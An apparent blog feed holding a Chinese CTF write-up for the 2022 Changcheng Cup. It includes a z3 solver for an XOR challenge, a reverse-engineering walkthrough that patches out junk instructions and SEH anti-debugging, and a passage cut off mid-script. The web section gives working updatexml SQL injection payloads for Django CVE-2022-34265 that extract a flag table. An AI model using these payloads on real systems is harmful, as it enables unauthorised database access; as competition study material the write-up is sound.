<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="https://feverhu.github.io/atom.xml" rel="self"/>
  
  <link href="https://feverhu.github.io/"/>
  <updated>2022-08-25T18:25:59.878Z</updated>
  <id>https://feverhu.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2022 长城杯政企组 wp</title>
    <link href="https://feverhu.github.io/2022/08/26/2022-%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%94%BF%E4%BC%81%E7%BB%84-wp/"/>
    <id>https://feverhu.github.io/2022/08/26/2022-%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%94%BF%E4%BC%81%E7%BB%84-wp/</id>
    <published>2022-08-25T16:05:23.000Z</published>
    <updated>2022-08-25T18:25:59.878Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2022-长城杯政企组-wp"><a href="#2022-长城杯政企组-wp" class="headerlink" title="2022 长城杯政企组 wp"></a>2022 长城杯政企组 wp</h1><p>这次比赛实际并列26名，前15名进入线下复赛，感觉距离线下赛越来越近了。Crypto简单题秒了，因为上班没有抢到前三拿加分，最后这道题第五。然后其余四个小时全部给了re的rabbit_hole，把大致的流程梳理出来了，但是卡在了异常处理，导致最后核心代码没有能够看到并且F5解析。队友做出来web题，赛后看了看misc的办公室爱情，也没用多少时间。如果比赛时候做了说不定就进复赛了？不可能的！没看规则，完全没有记得开录屏。马上打网鼎杯，不要忘了！</p><p>那天打完比赛，Re没做出来实在气不过，于是联系了好多年不联系传奇人物刘大爷，请刘大爷出山给我指点迷津，刘大爷把题秒了，给我讲了两点，立马全都解决了，果然是刘大爷，这个wp大部分功劳是刘大爷的。</p><h2 id="Crypto-xor"><a href="#Crypto-xor" class="headerlink" title="Crypto - xor"></a>Crypto - xor</h2><p>task.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cut</span>(<span class="params">obj, sec</span>):</span><br><span class="line">    <span class="keyword">return</span> [obj[i:i+sec] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(obj),sec)]</span><br><span class="line"></span><br><span class="line">x = <span class="number">6</span></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;flag&#123;&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> flag.endswith(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">m = cut(flag, x)</span><br><span class="line"></span><br><span class="line">pad = os.urandom(x)</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    tmp = []</span><br><span class="line"></span><br><span class="line">    tmp.append(i[<span class="number">0</span>] ^ i[<span class="number">1</span>] ^ i[<span class="number">2</span>] ^ pad[<span class="number">0</span>])</span><br><span class="line">    tmp.append(i[<span class="number">3</span>] ^ i[<span class="number">4</span>] ^ pad[<span class="number">1</span>] ^ pad[<span class="number">2</span>])</span><br><span class="line">    tmp.append(pad[<span class="number">5</span>] ^ i[<span class="number">5</span>] ^ pad[<span class="number">1</span>] ^ pad[<span class="number">3</span>])</span><br><span class="line">    tmp.append(i[<span class="number">3</span>] ^ pad[<span class="number">3</span>] ^ pad[<span class="number">4</span>] ^ pad[<span class="number">1</span>])</span><br><span class="line">    tmp.append(i[<span class="number">5</span>] ^ pad[<span class="number">0</span>] ^ i[<span class="number">4</span>] ^ pad[<span class="number">1</span>])</span><br><span class="line">    tmp.append(i[<span class="number">2</span>] ^ i[<span class="number">4</span>] ^ pad[<span class="number">0</span>] ^ pad[<span class="number">1</span>])</span><br><span class="line">    tmp.append(i[<span class="number">2</span>] ^ i[<span class="number">0</span>] ^ i[<span class="number">4</span>] ^ pad[<span class="number">4</span>])</span><br><span class="line">    </span><br><span class="line">    res.append(tmp)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment">#[[150, 194, 49, 195, 23, 79, 66], [194, 136, 63, 147, 3, 2, 81], [132, 221, 57, 144, 83, 83, 93], [208, 223, 37, 193, 28, 0, 70], [154, 203, 108, 156, 28, 78, 68], [159, 221, 62, 146, 86, 82, 88], [197, 141, 117, 192, 31, 90, 85]]</span></span><br></pre></td></tr></table></figure><p>入门题目，“flag{”是flag的前5位，然后是一个7元的方程，求pad6个数和flag{后一位有7个方程正好可以解。用z3即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">##求random，已知前5位是flag&#123;</span><br><span class="line"></span><br><span class="line">i = b&quot;flag&#123;&quot;</span><br><span class="line">so = Solver()</span><br><span class="line"></span><br><span class="line">ans = [150, 194, 49, 195, 23, 79, 66]</span><br><span class="line"></span><br><span class="line">flag5 = BitVec(&#x27;flag5&#x27;,8)</span><br><span class="line">pad = [BitVec(f&#x27;pad&#123;i&#125;&#x27;,8) for i in range(6)]</span><br><span class="line"></span><br><span class="line">so.add(i[0] ^ i[1] ^ i[2] ^ pad[0] == ans[0])</span><br><span class="line">so.add(i[3] ^ i[4] ^ pad[1] ^ pad[2] == ans[1])</span><br><span class="line">so.add(pad[5] ^ flag5 ^ pad[1] ^ pad[3] == ans[2])</span><br><span class="line">so.add(i[3] ^ pad[3] ^ pad[4] ^ pad[1] == ans[3])</span><br><span class="line">so.add(flag5 ^ pad[0] ^ i[4] ^ pad[1] == ans[4])</span><br><span class="line">so.add(i[2] ^ i[4] ^ pad[0] ^ pad[1] == ans[5])</span><br><span class="line">so.add(i[2] ^ i[0] ^ i[4] ^ pad[4] == ans[6])</span><br><span class="line">pad_ = []</span><br><span class="line">if so.check() == sat:</span><br><span class="line">m = so.model()</span><br><span class="line">for k in range(6):</span><br><span class="line">#print(m.eval(pad[k]).as_long())</span><br><span class="line">pad_.append(m.eval(pad[k]).as_long())</span><br><span class="line"></span><br><span class="line">#print(pad_)</span><br><span class="line">#[253, 168, 118, 50, 62, 146]</span><br><span class="line">ans = [[150, 194, 49, 195, 23, 79, 66], [194, 136, 63, 147, 3, 2, 81], [132, 221, 57, 144, 83, 83, 93], [208, 223, 37, 193, 28, 0, 70], [154, 203, 108, 156, 28, 78, 68], [159, 221, 62, 146, 86, 82, 88], [197, 141, 117, 192, 31, 90, 85]]</span><br><span class="line">flag_ = &quot;&quot;</span><br><span class="line">pad = pad_</span><br><span class="line">for i in ans:</span><br><span class="line">so = Solver()</span><br><span class="line">flag = [BitVec(f&#x27;flag&#123;i&#125;&#x27;,8) for i in range(6)]</span><br><span class="line">so.add(flag[0] ^ flag[1] ^ flag[2] ^ pad[0] == i[0])</span><br><span class="line">so.add(flag[3] ^ flag[4] ^ pad[1] ^ pad[2] == i[1])</span><br><span class="line">so.add(pad[5] ^ flag[5] ^ pad[1] ^ pad[3] == i[2])</span><br><span class="line">so.add(flag[3] ^ pad[3] ^ pad[4] ^ pad[1] == i[3])</span><br><span class="line">so.add(flag[5] ^ pad[0] ^ flag[4] ^ pad[1] == i[4])</span><br><span class="line">so.add(flag[2] ^ flag[4] ^ pad[0] ^ pad[1] == i[5])</span><br><span class="line">so.add(flag[2] ^ flag[0] ^ flag[4] ^ pad[4] == i[6])</span><br><span class="line">if so.check() == sat:</span><br><span class="line">m = so.model()</span><br><span class="line">#print(&#x27;&#x27;.join(chr(m[i].as_long()) for i in flag))</span><br><span class="line">flag_ += &#x27;&#x27;.join(chr(m[i].as_long()) for i in flag) </span><br><span class="line">else:</span><br><span class="line">print(&#x27;Error&#x27;)</span><br><span class="line"></span><br><span class="line">print(flag_)</span><br><span class="line">#flag&#123;98167a7e-1471-11ed-a068-da12656dd8d7&#125;</span><br></pre></td></tr></table></figure><h2 id="Web-djangogogo"><a href="#Web-djangogogo" class="headerlink" title="Web - djangogogo"></a>Web - djangogogo</h2><p>这题题解是队友写的。</p><p>CVE-2022-34265 Django Extract &amp; Trunc SQL注入漏洞</p><p>参考资料：<a href="http://www.ctfiot.com/47944.html">http://www.ctfiot.com/47944.html</a></p><p>由于字符长度限制。用<code>/?name=YEAR FROM sale_datetime)) and updatexml(1,concat(1,(select flag from flag),1),1)--</code>获取前半截flag。</p><p><img src="/2022/08/26/2022-%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%94%BF%E4%BC%81%E7%BB%84-wp/1661257426458.png" alt="1661257426458"></p><p>用<code>/?name=YEAR FROM sale_datetime)) and updatexml(10,concat((select RIGHT(flag,14) from flag ),1,1,1,1,1,1,1,1),1)--</code>获得后半段flag。</p><p><img src="/2022/08/26/2022-%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%94%BF%E4%BC%81%E7%BB%84-wp/1661257431800.png" alt="1661257431800"></p><h2 id="Misc-办公室爱情"><a href="#Misc-办公室爱情" class="headerlink" title="Misc - 办公室爱情"></a>Misc - 办公室爱情</h2><p>有大佬师傅写出来了：<a href="https://blog.csdn.net/weixin_44418623/article/details/126493352">https://blog.csdn.net/weixin_44418623/article/details/126493352</a></p><p>[题目下载]<a href="%E5%8A%9E%E5%85%AC%E5%AE%A4%E7%88%B1%E6%83%85.zip">办公室爱情</a></p><h2 id="Reverse-rabbit-hole"><a href="#Reverse-rabbit-hole" class="headerlink" title="Reverse - rabbit hole"></a>Reverse - rabbit hole</h2><p>这道题拿到以后运行起来，看起来像很朴素的题目，并且通过Exeinfo，并没有什么壳。</p><p><img src="/2022/08/26/2022-%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%94%BF%E4%BC%81%E7%BB%84-wp/1661446868005.png" alt="1661446868005"></p><p>然后用ida运行，找到main函数0x004016C0，发现完全不能F5。仔细看有两种画指令。第一种：</p><p><img src="/2022/08/26/2022-%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%94%BF%E4%BC%81%E7%BB%84-wp/1661447008186.png" alt="1661447008186"></p><p>这种可以直接patch掉EB FF中EB这一位，变成nop(90)，然后在40170A地址上按C转换为code，就可以看到后面的指令了。第二种：</p><p><img src="/2022/08/26/2022-%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%94%BF%E4%BC%81%E7%BB%84-wp/1661447155378.png" alt="1661447155378"></p><p>这种往上jmp的第一次见。经过尝试可以patch掉4017D5和4017D6两个地址为nop，然后nop掉jmp语句后面的五个地址4017D9到4017DD也nop掉。这种花指令就完成了。</p><p><img src="/2022/08/26/2022-%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%94%BF%E4%BC%81%E7%BB%84-wp/1661447330411.png" alt="1661447330411"></p><p>经过一顿漫长的操作，找到main函数的retn，从main函数push ebp开始选中到retn，按p，再f5终于可以看出main函数的全貌了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  /*</span><br><span class="line">  有一堆变量定义就不贴了，大家注意变量类型。</span><br><span class="line">  */</span><br><span class="line"></span><br><span class="line">  v31[0] = v3;</span><br><span class="line">  v31[1] = retaddr;</span><br><span class="line">  v4 = alloca(4532);</span><br><span class="line">  atexit(sub_401660);</span><br><span class="line">  sub_401A40();</span><br><span class="line">  gets_s(v29, 0x100u);</span><br><span class="line">  v5 = strlen(v29);</span><br><span class="line">  v6 = BYTE2(v5) ^ (16777619 * (BYTE1(v5) ^ (16777619 * ((unsigned __int8)v5 ^ 0x50C5D1F))));</span><br><span class="line">  v7 = HIBYTE(v5) ^ (16777619 * v6);</span><br><span class="line">  if ( v7 != 1166501587 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v7 == 1563082853 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = 0;</span><br><span class="line">      for ( i = 0; ; i = v9 + 16 )</span><br><span class="line">      &#123;</span><br><span class="line">        v25 = v8;</span><br><span class="line">        if ( (HIBYTE(v8) ^ (16777619</span><br><span class="line">                          * (BYTE2(v8) ^ (16777619 * (BYTE1(v8) ^ (16777619 * ((unsigned __int8)v8 ^ 0x50C5D1F))))))) == 1563082853 )</span><br><span class="line">          break;</span><br><span class="line">        v28 = 0;</span><br><span class="line">        v9 = i;</span><br><span class="line">        for ( j = 0; ; j = v26 + 1 )</span><br><span class="line">        &#123;</span><br><span class="line">          v26 = j;</span><br><span class="line">          if ( (HIBYTE(j) ^ (16777619</span><br><span class="line">                           * (BYTE2(j) ^ (16777619 * (BYTE1(j) ^ (16777619 * ((unsigned __int8)j ^ 0x50C5D1F))))))) == 1563082853 )</span><br><span class="line">            break;</span><br><span class="line">          v9 = i;</span><br><span class="line">          v28 += v29[v26] * byte_404AC0[i + v26];</span><br><span class="line">        &#125;</span><br><span class="line">        v11 = v25;</span><br><span class="line">        *((_BYTE *)&amp;v31[-1130] + v25) = v28;</span><br><span class="line">        v8 = v11 + 1;</span><br><span class="line">      &#125;</span><br><span class="line">      for ( k = 0;</span><br><span class="line">            (HIBYTE(k) ^ (16777619 * (BYTE2(k) ^ (16777619 * (BYTE1(k) ^ (16777619 * ((unsigned __int8)k ^ 0x50C5D1F))))))) != 1563082853;</span><br><span class="line">            ++k )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( *((_BYTE *)&amp;v31[-1130] + k) != byte_404AAC[k] )</span><br><span class="line">        &#123;</span><br><span class="line">          v13 = sub_401A40();</span><br><span class="line">          std::ostream::operator&lt;&lt;(v13);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v14 = sub_401A40();</span><br><span class="line">      std::ostream::operator&lt;&lt;(v14);</span><br><span class="line">      JUMPOUT(0x401A17);</span><br><span class="line">    &#125;</span><br><span class="line">    v15 = sub_401A40();</span><br><span class="line">    std::ostream::operator&lt;&lt;(v15);</span><br><span class="line">    exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  strcpy(v30, &quot;The quick brown fox jumps over the lazy dog.&quot;);</span><br><span class="line">  sub_401000(v30, v6);</span><br><span class="line">  memset(v30, 0, 40);</span><br><span class="line">  v17 = sub_4014E0(v30, v29, v16);</span><br><span class="line">  for ( m = 0; m &lt; 40; ++m )</span><br><span class="line">  &#123;</span><br><span class="line">    LOBYTE(v17) = v30[m];</span><br><span class="line">    if ( (_BYTE)v17 != byte_404BC0[m] )</span><br><span class="line">    &#123;</span><br><span class="line">      v22 = (*(int (**)(void))(v17 + 1284029000))();</span><br><span class="line">      byte_402FFF[v22 - 4206718] += BYTE1(v23);</span><br><span class="line">      *(_BYTE *)(v23 - 23) += v24;</span><br><span class="line">      JUMPOUT(0x401A3D);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v19 = sub_401A40();</span><br><span class="line">  v20 = std::ostream::operator&lt;&lt;(v19);</span><br><span class="line">  (*(void (**)(void))(v20 - 62026936))();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个需要逆向的地方是<code>  v6 = BYTE2(v5) ^ (16777619 * (BYTE1(v5) ^ (16777619 * ((unsigned __int8)v5 ^ 0x50C5D1F)))); v7 = HIBYTE(v5) ^ (16777619 * v6);if ( v7 != 1166501587 )</code></p><p>其中v5是输入字符串的长度，类型为int，四个字节。BYTE1是v5第二个字节，BYTE2是v5第三个字节，HIBYTE是最高字节，注意C语言变量是小端序。这段代码就是最小的字节和0x50C5D1F异或以后，乘以16777619，再和下一个字节异或，直到最高字节。于是python脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">for i in range(256):</span><br><span class="line">v7 = i</span><br><span class="line">v8 = ((v7 &gt;&gt; 16) &amp; 0xff) ^ ((0x1000193 * (((v7 &gt;&gt; 8) &amp; 0xff) ^ ((0x1000193 * (((v7 &amp; 0xFF) ^ 0x50C5D1F) &amp; 0xFFFFFFFF)) &amp; 0xFFFFFFFF))) &amp; 0xFFFFFFFF)</span><br><span class="line">v9 = ((v7 &gt;&gt; 32) &amp; 0xff) ^ ((0x1000193 * v8) &amp; 0xFFFFFFFF)</span><br><span class="line">if (v9 == 0x458766D3 or v9 == 0x5D2AC065):</span><br><span class="line">print(v9,i)</span><br><span class="line">0x5d2ac065 16</span><br><span class="line">0x458766d3 134</span><br></pre></td></tr></table></figure><p>这里有两个分支，长度为134的分支是正确的。长度是16的分支进入下面的代码</p><p><img src="/2022/08/26/2022-%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%94%BF%E4%BC%81%E7%BB%84-wp/1661448528575.png" alt="1661448528575"></p><p><img src="/2022/08/26/2022-%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%94%BF%E4%BC%81%E7%BB%84-wp/1661448555663.png" alt="1661448555663"></p><p>无论结果是啥都进入了0x401A40的地址，猜测一下，结合下文，很容易知道这段不是需要走的分支。（比赛时候我动调进去了，查了小一会儿发现不对，还是too young！这题应该有反调试，可能是SEH的，我的x96dbg有过反调插件sharpOD。ida直接动调不行的。）</p><p>之后，有个关键函数0x4014E0很可疑，调用了输入变量v29。</p><p><img src="/2022/08/26/2022-%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%94%BF%E4%BC%81%E7%BB%84-wp/1661448781490.png" alt="1661448781490"></p><p>经过一通patch后f5看到函数4014E0。发现关键语句<code>ms_exc.registration.TryLevel = 0</code></p><p>这是try except的特征。tab进入汇编视图发现有try，并且在0x401546产生了异常，进入except。当时看到了 <a href="https://bbs.pediy.com/thread-252152.htm">https://bbs.pediy.com/thread-252152.htm</a> 这篇大佬师傅写的文章，也研究了一下，动调在这里也断掉了一直挂。怎么也搞不通，直到比赛结束，我还是个老菜鸡。</p><p><img src="/2022/08/26/2022-%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%94%BF%E4%BC%81%E7%BB%84-wp/1661448903235.png" alt="1661448903235"></p><p>这个异常最后进入了0x4011E0这个函数，这是比赛中调到的地方。</p><p><img src="/2022/08/26/2022-%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%94%BF%E4%BC%81%E7%BB%84-wp/1661449148944.png" alt="1661449148944"></p><p>比赛结束之后，晚上问大爷，大爷解释：1、这个异常是<code>void x() &#123;char a[0];a[1145141919810];&#125;</code></p><p>2、SEH 反调试的原理是，遇到异常的时候会首先交给调试器，单步过不去。调试器需要改参数。</p><p><img src="/2022/08/26/2022-%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%94%BF%E4%BC%81%E7%BB%84-wp/1661449598278.png" alt="1661449598278"></p><p>忽略范围-开始-C0000005-确定。添加了这个就不会在0x401546卡住了。接着在exception handler下个断点可以进入0x4011E0这个最后的函数了。最后的函数中，也是一个try exception跳到exception欺骗ida，ida确实不分析exception handler 里的代码。之后经过大爷提示，在异常代码地址patch，用jmp直接跳到exception handler就行。把0x401232地址patch成jmp到0x401278，并且把0x401278上的try except的code也patch掉了。</p><p><img src="/2022/08/26/2022-%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%94%BF%E4%BC%81%E7%BB%84-wp/1661450025162.png" alt="1661450025162"></p><p><img src="/2022/08/26/2022-%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%94%BF%E4%BC%81%E7%BB%84-wp/1661450043745.png" alt="1661450043745"></p><p>f5后得到了最后的函数，核心部分：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v2 = input;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strlen</span>(input) )</span><br><span class="line">  &#123;</span><br><span class="line">    LOWORD(v4) = <span class="number">0</span>;</span><br><span class="line">    LOWORD(v5) = <span class="number">0</span>;</span><br><span class="line">LABEL_21:</span><br><span class="line">    <span class="keyword">if</span> ( (HIBYTE(v18) ^ (<span class="number">16777619</span></span><br><span class="line">                       * (BYTE2(v18) ^ (<span class="number">16777619</span> * (BYTE1(v5) ^ (<span class="number">16777619</span> * ((<span class="type">unsigned</span> __int8)v5 ^ <span class="number">0x50C5D1F</span>))))))) != <span class="number">1636823865</span></span><br><span class="line">      &amp;&amp; (HIBYTE(v17) ^ (<span class="number">16777619</span></span><br><span class="line">                       * (BYTE2(v17) ^ (<span class="number">16777619</span> * (BYTE1(v4) ^ (<span class="number">16777619</span> * ((<span class="type">unsigned</span> __int8)v4 ^ <span class="number">0x50C5D1F</span>))))))) != <span class="number">1636823865</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(v9);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">41</span>; ++i )</span><br><span class="line">      <span class="built_in">putchar</span>((<span class="type">unsigned</span> __int8)(*((_BYTE *)v12 + i) + *((_BYTE *)v14 + i)));</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v2[v1];</span><br><span class="line">    <span class="keyword">switch</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">        v18 = --v5;</span><br><span class="line">        v3 -= <span class="number">21</span>;</span><br><span class="line">        v16 = v3;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;j&#x27;</span>:</span><br><span class="line">        v18 = v5 + <span class="number">1</span>;</span><br><span class="line">        v16 = v3 + <span class="number">21</span>;</span><br><span class="line">        v4 = v17;</span><br><span class="line">        ++v5;</span><br><span class="line">        v3 += <span class="number">21</span>;</span><br><span class="line">        v1 = v10;</span><br><span class="line">        v2 = input;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;k&#x27;</span>:</span><br><span class="line">        --v4;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>:</span><br><span class="line">        ++v4;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = v4;</span><br><span class="line">LABEL_12: <span class="comment">//判断条件</span></span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt; <span class="number">0</span></span><br><span class="line">      || v4 &lt; <span class="number">0</span></span><br><span class="line">      || v5 &gt;= <span class="number">21</span></span><br><span class="line">      || v4 &gt;= <span class="number">21</span></span><br><span class="line">      || (v5 ^ (v4 &lt;&lt; <span class="number">8</span>) ^ dword_4043C8[v3 + v4] ^ (<span class="type">unsigned</span> __int8)byte_404208[v3 + v4]) != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = ++v1;</span><br><span class="line">    v7 = <span class="built_in">strlen</span>(v2);</span><br><span class="line">    v3 = v16;</span><br><span class="line">    v2 = input;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt;= v7 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这显然是一个迷宫。Label12是判断条件，Label21的if满足以后，就可以真正得到flag。</p><p>先满足Label21的if:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> v7 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">v8 = ((v7 &gt;&gt; <span class="number">16</span>) &amp; <span 